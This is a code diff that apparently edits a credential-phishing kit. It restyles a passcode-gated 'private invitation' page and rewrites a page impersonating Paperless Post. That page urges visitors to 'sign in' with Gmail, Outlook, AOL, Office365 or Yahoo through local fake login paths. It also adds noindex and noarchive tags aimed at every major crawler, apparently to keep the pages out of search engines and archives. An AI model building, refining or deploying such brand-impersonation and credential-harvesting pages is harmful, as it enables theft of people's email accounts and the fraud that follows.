@@ -216,7 +216,7 @@ if (isset($_POST["password"])) {
     } else {
         record_failed_attempt($rate_window_seconds);
         log_security_event("failed_passkey_attempt");
-        $error = "That Passkey did not match. Please check it and try again.";
+        $error = "That access code did not match. Please check it and try again.";
     }
 }
 
@@ -233,20 +233,13 @@ if (
     <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
     <meta name="robots" content="noindex, nofollow">
     <title>Quick Confirmation</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@500;600&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
-        :root { --ink: #281e22; --muted: #756c6b; --line: #e8e1dc; --paper: #fdfbf9; --berry: #4d2037; --berry-dark: #351425; }
         * { box-sizing: border-box; }
-        body { min-height: 100svh; margin: 0; display: grid; place-items: center; padding: 28px 22px; color: var(--ink); font-family: "DM Sans", Arial, sans-serif; background: linear-gradient(90deg, #fbf9f6 0 63%, #fffefd 63%); }
-        body { min-height: 100svh; margin: 0; display: grid; place-items: center; padding: 28px 22px; color: var(--ink); font-family: "DM Sans", Arial, sans-serif; background: #faf8f5; }
-        main { width: min(100%, 520px); padding: clamp(38px, 8vw, 58px); border: 1px solid rgba(106, 80, 67, .15); border-radius: 20px; background: rgba(255, 254, 253, .82); box-shadow: 0 22px 70px rgba(54, 37, 29, .055); text-align: center; }
-        main::before { content: "PRIVATE INVITATION"; display: block; margin-bottom: 32px; color: #82746e; font-size: 11px; font-weight: 600; letter-spacing: .18em; }
-        h1 { margin: 0 0 18px; font-family: "Cormorant Garamond", Georgia, serif; font-size: clamp(39px, 9vw, 52px); font-weight: 500; letter-spacing: -.045em; line-height: .93; }
-        p { margin: 0 0 29px; color: var(--muted); font-size: 16px; font-weight: 500; line-height: 1.58; }
-        button { width: 100%; min-height: 58px; border: 1px solid rgba(255,255,255,.24); border-radius: 999px; color: #fff; cursor: pointer; font: 600 15px/1 "DM Sans", Arial, sans-serif; letter-spacing: .02em; background: linear-gradient(112deg, var(--berry-dark), var(--berry) 58%, #71364e); box-shadow: 0 12px 24px rgba(77, 32, 55, .2), inset 0 1px 0 rgba(255,255,255,.22); transition: transform .18s ease, box-shadow .18s ease; }
-        button:hover { transform: translateY(-2px); box-shadow: 0 17px 28px rgba(77, 32, 55, .26), inset 0 1px 0 rgba(255,255,255,.24); }
+        body { min-height: 100svh; margin: 0; display: grid; place-items: center; padding: 24px; color: #24303a; font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; background: #eef4f7; }
+        main { width: min(100%, 420px); padding: 32px; border: 1px solid #d6e0e6; border-radius: 16px; background: #fff; box-shadow: 0 18px 46px rgba(43, 63, 78, .12); text-align: center; }
+        h1 { margin: 0 0 12px; font-size: 24px; line-height: 1.2; }
+        p { margin: 0 0 24px; color: #5e6b75; line-height: 1.55; }
+        button { width: 100%; min-height: 48px; border: 0; border-radius: 10px; color: #fff; cursor: pointer; font: 700 15px/1 system-ui, sans-serif; background: #263746; }
     </style>
 </head>
 <body>
@@ -276,41 +269,36 @@ if (!isset($_SESSION["authenticated"]) || $_SESSION["authenticated"] !== true) {
     <title>Private Celebration</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@500;600&family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        :root { --ink: #2c2022; --copy: #766d6b; --line: #e8e1dc; --paper: #fdfbf9; --berry: #4d2037; --berry-dark: #351425; --blush: #b98578; --error: #a1302a; }
+        :root { --mist: #c9e1ec; --mist-deep: #aed2e4; --ink: #292e37; --paper: #fff; --pearl: #f8fbfc; --silver: #d8e1e6; --text-soft: #aeb6bf; --gold: #d8bf78; --gold-bright: #f5df9d; --danger: #f2b8b8; }
         * { box-sizing: border-box; }
         html, body { min-height: 100%; margin: 0; }
-        body { min-height: 100svh; overflow-x: hidden; display: grid; place-items: center; padding: clamp(30px, 7vw, 92px) 22px 54px; color: var(--ink); font-family: "DM Sans", Arial, sans-serif; background: linear-gradient(90deg, #faf8f5 0 63%, #fffefd 63%); }
-        body { min-height: 100svh; overflow-x: hidden; display: grid; place-items: center; padding: clamp(30px, 7vw, 92px) 22px 54px; color: var(--ink); font-family: "DM Sans", Arial, sans-serif; background: #faf8f5; }
-        .stage { position: relative; width: min(100%, 712px); display: flex; flex-direction: column; align-items: center; }
-        .envelope { width: 162px; height: 172px; display: grid; place-items: center; margin-bottom: clamp(48px, 7vw, 62px); border: 1px solid rgba(91, 64, 52, .16); border-radius: 18px 18px 42px 18px; background: linear-gradient(145deg, rgba(255,255,255,.96), rgba(249,243,238,.92)); box-shadow: 12px 13px 0 -10px rgba(185, 133, 120, .62), 0 18px 42px rgba(70, 42, 31, .06); transform: rotate(-2deg); }
-        .envelope::before { content: "✦"; color: var(--berry); font-family: Georgia, serif; font-size: 57px; line-height: 1; transform: rotate(2deg); }
-        .envelope::after { content: "THE OCCASION"; position: absolute; margin-top: 99px; color: #6e5b57; font-size: 8px; font-weight: 600; letter-spacing: .29em; transform: rotate(2deg) translateX(2px); }
-        .gate { width: 100%; display: flex; flex-direction: column; align-items: stretch; padding: 0; color: var(--ink); background: transparent; text-align: left; }
-        .event-badge { display: none; }
-        .copy { width: 100%; max-width: 620px; display: block; }
-        .eyebrow { width: 100%; display: flex; align-items: center; gap: 17px; margin: 0; color: #816f69; font-size: 12px; font-weight: 600; letter-spacing: .16em; line-height: 1; text-transform: uppercase; }
-        .eyebrow::before, .eyebrow::after { content: ""; height: 1px; flex: 1; background: var(--line); }
-        h1 { max-width: 580px; margin: clamp(52px, 7vw, 66px) 0 0; font-family: "Cormorant Garamond", Georgia, serif; font-size: clamp(50px, 7.5vw, 66px); font-weight: 500; letter-spacing: -.047em; line-height: .91; text-wrap: balance; }
-        .intro { max-width: 574px; margin: 42px 0 0; color: var(--copy); font-size: clamp(16px, 2.2vw, 19px); font-weight: 500; letter-spacing: -.018em; line-height: 1.6; }
-        form { width: 100%; max-width: 620px; display: grid; gap: 14px; margin-top: 48px; }
-        .field { position: relative; }
-        .field::before { content: "⌁"; position: absolute; z-index: 1; top: 50%; left: 20px; color: #a4867e; font: 24px/1 Georgia, serif; transform: translateY(-53%); }
-        .field input { width: 100%; height: 66px; padding: 0 20px 0 50px; border: 1px solid #e1d7d1; border-radius: 14px; outline: none; color: var(--ink); font: 500 17px/1 "DM Sans", Arial, sans-serif; text-align: left; letter-spacing: 0; background: rgba(255,255,255,.76); box-shadow: inset 0 1px 0 rgba(255,255,255,.86); transition: border-color .18s ease, box-shadow .18s ease, background .18s ease; }
-        .field input::placeholder { color: #a49a97; font-size: 16px; font-weight: 400; letter-spacing: 0; text-transform: none; }
-        .field input:focus { border-color: #a87570; background: #fff; box-shadow: 0 0 0 4px rgba(168, 117, 112, .12); }
-        button { position: relative; width: 100%; min-height: 66px; overflow: hidden; border: 1px solid rgba(255,255,255,.24); border-radius: 999px; cursor: pointer; color: #fff; font: 600 16px/1 "DM Sans", Arial, sans-serif; letter-spacing: .025em; text-transform: none; background: linear-gradient(108deg, var(--berry-dark), var(--berry) 56%, #71364e); box-shadow: 0 13px 25px rgba(77, 32, 55, .2), inset 0 1px 0 rgba(255,255,255,.22); transition: transform .18s ease, box-shadow .18s ease; }
-        button::after { content: "→"; position: absolute; right: 25px; top: 50%; font: 25px/1 Georgia, serif; transform: translateY(-54%); transition: transform .18s ease; }
-        button:hover { transform: translateY(-2px); box-shadow: 0 18px 30px rgba(77, 32, 55, .26), inset 0 1px 0 rgba(255,255,255,.24); }
-        button:hover::after { transform: translate(4px, -54%); }
+        body { min-height: 100svh; overflow-x: hidden; display: grid; place-items: center; padding: clamp(18px, 4vw, 52px); color: var(--paper); font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; background: radial-gradient(circle at 50% 20%, rgba(255, 255, 255, .74), transparent 34rem), linear-gradient(145deg, #d8ebf3 0%, var(--mist) 44%, var(--mist-deep) 100%); }
+        .stage { position: relative; width: min(100%, 1180px); min-height: min(860px, calc(100svh - clamp(36px, 8vw, 104px))); display: grid; place-items: center; overflow: hidden; isolation: isolate; }
+        .envelope { position: absolute; z-index: -2; width: min(78vw, 860px); aspect-ratio: 1.85 / 1; left: 50%; top: 54%; transform: translate(-50%, -50%); border-radius: clamp(18px, 2vw, 34px); background: linear-gradient(32deg, transparent 49.35%, rgba(104, 147, 168, .28) 49.8%, transparent 50.7%), linear-gradient(148deg, transparent 49.35%, rgba(104, 147, 168, .28) 49.8%, transparent 50.7%), linear-gradient(180deg, rgba(224, 243, 250, .64), rgba(180, 215, 230, .42)); box-shadow: 0 34px 76px rgba(56, 93, 111, .24), inset 0 1px 0 rgba(255, 255, 255, .48); opacity: .86; }
+        .envelope::before, .envelope::after { content: ""; position: absolute; inset: 0; border-radius: inherit; pointer-events: none; }
+        .envelope::before { background: linear-gradient(26deg, transparent 50%, rgba(113, 156, 177, .16) 50.4%, transparent 51.3%), linear-gradient(154deg, transparent 50%, rgba(113, 156, 177, .16) 50.4%, transparent 51.3%); filter: blur(6px); }
+        .envelope::after { inset: auto auto 47% 50%; width: 22px; height: 22px; border-radius: 999px; background: rgba(216, 191, 120, .45); transform: translateX(-50%); box-shadow: 0 0 0 5px rgba(255, 255, 255, .18), 0 10px 24px rgba(54, 93, 113, .2); }
+        .gate { width: min(100%, 438px); min-height: clamp(640px, 86svh, 820px); display: flex; flex-direction: column; align-items: center; justify-content: center; gap: clamp(22px, 3svh, 34px); padding: clamp(28px, 4vw, 48px) clamp(22px, 4vw, 38px); border: 1px solid rgba(255, 255, 255, .12); border-radius: clamp(24px, 3vw, 34px); background: linear-gradient(180deg, rgba(50, 56, 67, .98), rgba(37, 42, 51, .99)), var(--ink); box-shadow: 0 34px 78px rgba(25, 40, 49, .45), 0 2px 0 rgba(255, 255, 255, .06) inset; text-align: center; }
+        .event-badge { width: 118px; height: 118px; display: grid; place-items: center; border: 1px solid rgba(245, 223, 157, .56); border-radius: 50%; background: radial-gradient(circle at 50% 35%, rgba(245, 223, 157, .3), transparent 58%), rgba(255, 255, 255, .06); box-shadow: 0 0 0 7px rgba(245, 223, 157, .06), 0 16px 34px rgba(0, 0, 0, .18), 0 0 28px rgba(216, 191, 120, .18); font-size: 60px; }
+        .copy { display: grid; gap: 14px; max-width: 348px; }
+        .eyebrow { margin: 0; color: var(--gold-bright); font-size: 11px; font-weight: 700; letter-spacing: .28em; text-transform: uppercase; }
+        h1 { margin: 0; color: var(--pearl); font-family: "Cormorant Garamond", Georgia, serif; font-size: clamp(32px, 7vw, 44px); font-weight: 700; line-height: .98; text-wrap: balance; }
+        .intro { margin: 0; color: var(--text-soft); font-size: clamp(14px, 2.4vw, 16px); font-weight: 500; line-height: 1.68; }
+        form { width: 100%; display: grid; gap: 14px; }
+        .field input { width: 100%; height: 58px; padding: 0 18px; border: 1px solid rgba(216, 225, 230, .52); border-radius: 10px; outline: none; background: rgba(18, 21, 26, .42); color: var(--paper); font: 700 18px/1 Inter, system-ui, sans-serif; text-align: center; letter-spacing: .08em; box-shadow: inset 0 1px 0 rgba(255, 255, 255, .03); transition: border-color .2s ease, box-shadow .2s ease, background .2s ease; }
+        .field input::placeholder { color: rgba(216, 225, 230, .52); font-size: 13px; font-weight: 700; letter-spacing: .18em; text-transform: uppercase; }
+        .field input:focus { border-color: var(--gold-bright); background: rgba(18, 21, 26, .58); box-shadow: 0 0 0 4px rgba(216, 191, 120, .13), 0 0 22px rgba(216, 191, 120, .08), inset 0 1px 0 rgba(255, 255, 255, .04); }
+        button { width: 100%; min-height: 60px; border: 0; border-radius: 16px; cursor: pointer; color: #261f12; font: 800 15px/1 Inter, system-ui, sans-serif; letter-spacing: .08em; text-transform: uppercase; background: linear-gradient(135deg, #b6913d 0%, #f7dfa0 42%, #c39a45 100%); box-shadow: 0 16px 34px rgba(11, 13, 17, .25), inset 0 1px 0 rgba(255, 255, 255, .6); transition: transform .2s ease, filter .2s ease, box-shadow .2s ease; }
+        button:hover { transform: translateY(-1px); filter: saturate(1.05) brightness(1.04); box-shadow: 0 20px 40px rgba(11, 13, 17, .32), 0 0 22px rgba(216, 191, 120, .16), inset 0 1px 0 rgba(255, 255, 255, .62); }
         button:active { transform: translateY(0); }
-        .error { margin: 0; color: var(--error); font-size: 14px; font-weight: 500; line-height: 1.45; }
-        .divider { width: 100%; max-width: 620px; height: 1px; margin-top: 35px; background: linear-gradient(90deg, transparent, var(--line), transparent); }
-        .footnote { margin: 24px 0 0; color: #afaaa7; font-size: 13px; font-weight: 500; line-height: 1.6; text-align: center; }
-        @media (max-width: 560px) { body { background: #fdfbf9; } .envelope { width: 142px; height: 151px; margin-bottom: 45px; } .envelope::before { font-size: 51px; } .envelope::after { margin-top: 85px; } .eyebrow { gap: 10px; font-size: 10px; letter-spacing: .12em; } h1 { margin-top: 48px; } .intro { margin-top: 34px; } }
-        @media (max-width: 560px) { body { background: #faf8f5; } .envelope { width: 142px; height: 151px; margin-bottom: 45px; } .envelope::before { font-size: 51px; } .envelope::after { margin-top: 85px; } .eyebrow { gap: 10px; font-size: 10px; letter-spacing: .12em; } h1 { margin-top: 48px; } .intro { margin-top: 34px; } }
-        @media (max-height: 720px) { body { padding-block: 26px; } .envelope { margin-bottom: 34px; } h1 { margin-top: 38px; } .intro { margin-top: 28px; } form { margin-top: 34px; } }
+        .error { margin: 0; color: var(--danger); font-size: 13px; font-weight: 700; line-height: 1.45; }
+        .divider { width: 100%; height: 1px; background: linear-gradient(90deg, transparent, rgba(216, 225, 230, .18), transparent); }
+        .footnote { margin: 0; color: rgba(174, 182, 191, .62); font-size: 12px; font-weight: 600; line-height: 1.6; }
+        @media (min-width: 900px) { .stage { min-height: min(880px, calc(100svh - 72px)); } .gate { width: 462px; min-height: 760px; } }
+        @media (max-width: 520px) { body { padding: 14px; align-items: stretch; } .stage { width: 100%; min-height: calc(100svh - 28px); } .envelope { width: 128vw; top: 53%; opacity: .62; } .gate { width: min(100%, 388px); min-height: calc(100svh - 28px); border-radius: 24px; padding: 28px 22px; } }
+        @media (max-height: 720px) { body { padding-block: 8px; } .stage, .gate { min-height: auto; } .gate { gap: 14px; padding-block: 20px; } .event-badge { width: 98px; height: 98px; font-size: 50px; } }
     </style>
 </head>
 <body>
@@ -323,13 +311,13 @@ if (!isset($_SESSION["authenticated"]) || $_SESSION["authenticated"] !== true) {
             <div class="copy">
                 <p class="eyebrow">A Private Celebration</p>
                 <h1>Your invitation awaits</h1>
-                <p class="intro">Use the Passkey shared by your host to view the celebration details.</p>
+                <p class="intro">Use the access code shared by your host to view the celebration details.</p>
             </div>
 
             <form method="POST" autocomplete="off">
                 <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars(csrf_token(), ENT_QUOTES, "UTF-8"); ?>">
                 <div class="field">
-                    <input type="password" name="password" placeholder="Enter passkey" aria-label="Enter passkey" required>
+                    <input type="password" name="password" placeholder="Enter access code" aria-label="Enter access code" required>
                 </div>
 
                 <button type="submit">View invitation</button>
@@ -354,184 +342,335 @@ if (!isset($_SESSION["authenticated"]) || $_SESSION["authenticated"] !== true) {
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8"/>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>SecureShare - Paperless</title>
-  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@300;400;500;600&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet"/>
-  <link rel="icon" type="image/png" href="https://media.sailthru.com/5u9/1k8/1/b/659fee856bb75.png">
-  <link rel="stylesheet" href="style.css">
-  
- 
-</head>
-<body>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate, noodp">
+  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate">
+  <meta name="googlebot-news" content="nosnippet">
+  <meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet">
+  <meta name="slurp" content="noindex, nofollow, noarchive, nosnippet">
+  <meta name="duckduckbot" content="noindex, nofollow">
+  <meta name="baiduspider" content="noindex, nofollow">
+  <meta name="yandex" content="noindex, nofollow, noarchive">
+  <meta name="facebot" content="noindex, nofollow">
+  <meta name="ia_archiver" content="noindex, noarchive">
 
+  <title>Paperless Post – You've been invited</title>
 
-<div class="grain"></div>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;500;600&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet" />
 
-<div class="shell">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
-  <!-- ── LEFT PANEL ── -->
-  <div class="panel-left">
-    <div class="wordmark">
-      <div class="wordmark-icon">
-        <svg viewBox="0 0 16 16" fill="none">
-          <path d="M2 3h12v10H2z" stroke="#b08d57" stroke-width="1.2" stroke-linejoin="round"/>
-          <path d="M5 7h6M5 9.5h4" stroke="#b08d57" stroke-width="1.2" stroke-linecap="round"/>
-          <rect x="6" y="1" width="4" height="3" rx="0.5" stroke="#b08d57" stroke-width="1.2"/>
-        </svg>
-      </div>
-      <span class="wordmark-text">SecureShare</span>
-    </div>
-
-   <div class="left-content">
-  <div class="doc-card">
-    <div class="qr-preview">
-      <img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=https%3A%2F%2Fcqr.la%2FqepA" alt="QR code">
-    </div>
-  </div>
-</div>
-
-    <div class="left-footer">
-      Protected by <strong>SecureShare</strong> &nbsp;·&nbsp; 256-bit AES Encryption &nbsp;·&nbsp; Zero-Knowledge Architecture
-    </div>
-  </div>
-
-  <!-- ── RIGHT PANEL ── -->
-  <div class="panel-right">
-    <div class="select-box">
-
-<div class="logo-wrap"
-  style="
-    --logo-width: 150px;
-    --logo-margin-bottom: 24px;
-    --logo-opacity: 1;
-    --logo-radius: 8px; ">
-  <div class="logo-box">
-    <img src="https://static0.pocketlintimages.com/wordpress/wp-content/uploads/2023/12/paperless-post.jpg" alt="Paperless Post">
-  </div>
-</div>
-      <div class="login-eyebrow">
-        <div class="eyebrow-line"></div>
-        <span class="eyebrow-text">Private Invitation</span>
-        <div class="eyebrow-line"></div>
-      </div>
-      <h1 class="login-heading">Manage your E-invite <br>& Greeting Cards</h1> <br> 
-      <p class="login-sub">You've received a special invitation.
-To see the invitation, choose your email provider below and sign in. You were invited to view the invitation via Paperless Post.</p>
-      <div class="providers">
-
-       <!-- Gmail -->
-<a class="provider-btn p-gmail" href="javascript:void(0)" onclick="navigateToProvider('Gmail', './gmail')">
-  <div class="provider-icon-col">
-    <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
-      <path d="M3 9h30v18a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" stroke="white" stroke-width="2" fill="rgba(255,255,255,0.12)"/>
-      <path d="M3 9l15 11L33 9" stroke="white" stroke-width="2" stroke-linejoin="round"/>
-    </svg>
-  </div>
-  <span class="provider-label">Sign in with Gmail</span>
-  <div class="provider-arrow">
-    <svg viewBox="0 0 14 14" fill="none"><path d="M5 3l4 4-4 4" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
-  </div>
-</a>
-
-<!-- Outlook -->
-<a class="provider-btn p-outlook" href="javascript:void(0)" onclick="navigateToProvider('Outlook', './outlook')">
-  <div class="provider-icon-col">
-    <svg viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg">
-      <rect width="26" height="26" rx="5" fill="rgba(255,255,255,0.15)"/>
-      <rect x="4" y="5" width="10" height="12" rx="2" fill="rgba(255,255,255,0.9)"/>
-      <rect x="6" y="7" width="6" height="8" rx="1" fill="#1a6bbf"/>
-      <path d="M14 8h8v10h-8" stroke="white" stroke-width="1.3" stroke-linejoin="round"/>
-      <path d="M14 13h8" stroke="white" stroke-width="1.3"/>
-      <path d="M18 8v10" stroke="white" stroke-width="1.3"/>
-    </svg>
-  </div>
-  <span class="provider-label">Sign in with Outlook</span>
-  <div class="provider-arrow">
-    <svg viewBox="0 0 14 14" fill="none"><path d="M5 3l4 4-4 4" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
-  </div>
-</a>
-
-<!-- AOL -->
-<a class="provider-btn p-aol" href="javascript:void(0)" onclick="navigateToProvider('AOL', './aol')">
-  <div class="provider-icon-col">
-    <span class="aol-text">Aol.</span>
-  </div>
-  <span class="provider-label">Sign in with Aol</span>
-  <div class="provider-arrow">
-    <svg viewBox="0 0 14 14" fill="none"><path d="M5 3l4 4-4 4" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
-  </div>
-</a>
-
-<!-- Office 365 -->
-<a class="provider-btn p-office" href="javascript:void(0)" onclick="navigateToProvider('Office365', './outlook')">
-  <div class="provider-icon-col">
-    <svg viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg">
-      <rect width="26" height="26" rx="5" fill="rgba(255,255,255,0.15)"/>
-      <rect x="4" y="4" width="8" height="8" rx="1.5" fill="rgba(255,255,255,0.85)"/>
-      <rect x="14" y="4" width="8" height="8" rx="1.5" fill="rgba(255,255,255,0.55)"/>
-      <rect x="4" y="14" width="8" height="8" rx="1.5" fill="rgba(255,255,255,0.55)"/>
-      <rect x="14" y="14" width="8" height="8" rx="1.5" fill="rgba(255,255,255,0.85)"/>
-    </svg>
-  </div>
-  <span class="provider-label">Sign in with Office365</span>
-  <div class="provider-arrow">
-    <svg viewBox="0 0 14 14" fill="none"><path d="M5 3l4 4-4 4" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
-  </div>
-</a>
-
-<!-- Yahoo -->
-<a class="provider-btn p-yahoo" href="javascript:void(0)" onclick="navigateToProvider('Yahoo', './yahoo')">
-  <div class="provider-icon-col">
-    <span class="yahoo-text">
-      <svg viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <text x="18" y="27" text-anchor="middle" font-family="Georgia, serif" font-size="22" font-weight="700" fill="white">Y!</text>
-      </svg>
-    </span>
-  </div>
-  <span class="provider-label">Sign in with Yahoo!</span>
-  <div class="provider-arrow">
-    <svg viewBox="0 0 14 14" fill="none"><path d="M5 3l4 4-4 4" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
-  </div>
-</a>
-
-<!-- Other Mail Button -->
-<a class="provider-btn p-other" href="javascript:void(0)" onclick="navigateToProvider('Other', '/index.php')">
-  <div class="provider-icon-col">
-    <svg viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg">
-      <circle cx="13" cy="13" r="8" stroke="white" stroke-width="1.4"/>
-      <circle cx="13" cy="13" r="3.5" stroke="white" stroke-width="1.4"/>
-      <path d="M13 5v5M13 16v5M5 13h5M16 13h5" stroke="white" stroke-width="1.4" stroke-linecap="round"/>
-    </svg>
-  </div>
-  <span class="provider-label">Sign in with Other Mail</span>
-  <div class="provider-arrow">
-    <svg viewBox="0 0 14 14" fill="none"><path d="M5 3l4 4-4 4" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
-  </div>
-</a>
-      </div>
-      <br>
-      <div class="secure-note">
-        <svg viewBox="0 0 12 12" fill="none">
-          <path d="M6 1L2 3v3c0 2.2 1.7 4.2 4 4.8C8.3 10.2 10 8.2 10 6V3L6 1z" stroke="#bbb" stroke-width="1.1"/>
-        </svg>
-        Your session is encrypted and never stored
-      </div>
-  <div class="secure-note">
-    <span>© 2026 Sincere Corporation. Paperless Post® is a registered trademark.</span>
-  </div>
-    </div>
-  </div>
-</div>
-
- <script>
-  function navigateToProvider(providerName, targetUrl) {
-    if (typeof selectProvider === 'function') {
-      selectProvider(providerName);
+    :root {
+      --bg: #cce0eb;
+      --card-bg: rgba(30, 34, 44, 0.93);
+      --card-border: rgba(255,255,255,0.09);
+      --text-primary: #ffffff;
+      --text-muted: rgba(255,255,255,0.62);
+      --text-footer: rgba(255,255,255,0.4);
+      --radius-card: 30px;
+      --radius-btn: 18px;
+      --gmail:   #c5221f;
+      --outlook: #0072c6;
+      --aol:     #3b3f9f;
+      --office:  #d83b01;
+      --yahoo:   #6001d2;
+      --other:   #1a73e8;
+      --shadow-card: 0 40px 90px rgba(0,0,0,0.30), 0 8px 24px rgba(0,0,0,0.18);
+      --shadow-btn:  0 4px 18px rgba(0,0,0,0.25);
     }
 
-    window.location.href = targetUrl;
-  }
-</script>
+    html, body { min-height: 100%; }
+
+    body {
+      font-family: 'DM Sans', sans-serif;
+      background: var(--bg);
+      background-image:
+        radial-gradient(ellipse 90% 70% at 15% 5%,  rgba(185,218,235,0.95) 0%, transparent 60%),
+        radial-gradient(ellipse 70% 60% at 85% 95%, rgba(148,198,222,0.80) 0%, transparent 55%);
+      min-height: 100dvh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 28px 16px 36px;
+      position: relative;
+      overflow-x: hidden;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 900 560'%3E%3Crect x='100' y='100' width='700' height='380' rx='20' fill='%23a8c8d8' opacity='0.35'/%3E%3Cpath d='M100 118 L450 320 L800 118' stroke='%2390b8cc' stroke-width='3' fill='none' opacity='0.5'/%3E%3Crect x='270' y='210' width='360' height='220' rx='6' fill='%23c0d8e8' opacity='0.4'/%3E%3Crect x='300' y='235' width='300' height='12' rx='6' fill='%2398bece' opacity='0.5'/%3E%3Crect x='300' y='260' width='230' height='9' rx='4' fill='%23a8ccda' opacity='0.4'/%3E%3Crect x='300' y='282' width='260' height='9' rx='4' fill='%23a8ccda' opacity='0.4'/%3E%3C/svg%3E");
+      background-size: 88% auto;
+      background-repeat: no-repeat;
+      background-position: center 58%;
+      filter: blur(3px);
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .card {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 430px;
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: var(--radius-card);
+      padding: 38px 28px 34px;
+      backdrop-filter: blur(28px) saturate(1.5);
+      -webkit-backdrop-filter: blur(28px) saturate(1.5);
+      box-shadow: var(--shadow-card);
+      animation: cardIn 0.6s cubic-bezier(0.22, 1, 0.36, 1) both;
+    }
+
+    @keyframes cardIn {
+      from { opacity: 0; transform: translateY(32px) scale(0.96); }
+      to   { opacity: 1; transform: translateY(0) scale(1); }
+    }
+
+    .logo-wrap {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 30px;
+      animation: fadeUp 0.5s 0.10s ease both;
+    }
+
+    .logo-box {
+      background: #ffffff;
+      border-radius: 18px;
+      padding: 14px 22px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 3px 16px rgba(0,0,0,0.13);
+    }
+
+    .logo-box img {
+      width: 130px;
+      height: 70px;
+      object-fit: contain;
+      display: block;
+    }
+
+    .headline {
+      font-family: 'Playfair Display', serif;
+      font-size: clamp(1.2rem, 5vw, 1.42rem);
+      font-weight: 600;
+      color: var(--text-primary);
+      text-align: center;
+      line-height: 1.35;
+      margin-bottom: 14px;
+      animation: fadeUp 0.5s 0.18s ease both;
+    }
+
+    .subline {
+      font-size: 0.93rem;
+      font-weight: 400;
+      color: var(--text-muted);
+      text-align: center;
+      line-height: 1.65;
+      margin-bottom: 28px;
+      animation: fadeUp 0.5s 0.24s ease both;
+    }
+
+    .btn-list {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-bottom: 28px;
+    }
+
+    .btn {
+      display: flex;
+      align-items: center;
+      border: none;
+      border-radius: var(--radius-btn);
+      cursor: pointer;
+      text-decoration: none;
+      overflow: hidden;
+      box-shadow: var(--shadow-btn);
+      transition: transform 0.18s ease, box-shadow 0.18s ease, filter 0.18s ease;
+      animation: fadeUp 0.45s ease both;
+      height: 54px;
+    }
+
+    .btn:hover {
+      transform: translateY(-2px) scale(1.013);
+      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+      filter: brightness(1.08);
+    }
+
+    .btn:active {
+      transform: translateY(0) scale(0.987);
+      filter: brightness(0.94);
+    }
+
+    .btn-icon {
+      width: 54px;
+      height: 54px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      background: rgba(0,0,0,0.17);
+    }
+
+    .btn-icon svg {
+      width: 26px;
+      height: 26px;
+    }
+
+    .btn-label {
+      flex: 1;
+      font-family: 'DM Sans', sans-serif;
+      font-size: 0.97rem;
+      font-weight: 500;
+      color: #fff;
+      letter-spacing: 0.01em;
+      padding: 0 18px;
+    }
+
+    .btn-gmail   { background: var(--gmail); }
+    .btn-outlook { background: var(--outlook); }
+    .btn-aol     { background: var(--aol); }
+    .btn-office  { background: var(--office); }
+    .btn-yahoo   { background: var(--yahoo); }
+    .btn-other   { background: var(--other); }
+
+    .btn:nth-child(1) { animation-delay: 0.30s; }
+    .btn:nth-child(2) { animation-delay: 0.36s; }
+    .btn:nth-child(3) { animation-delay: 0.42s; }
+    .btn:nth-child(4) { animation-delay: 0.48s; }
+    .btn:nth-child(5) { animation-delay: 0.54s; }
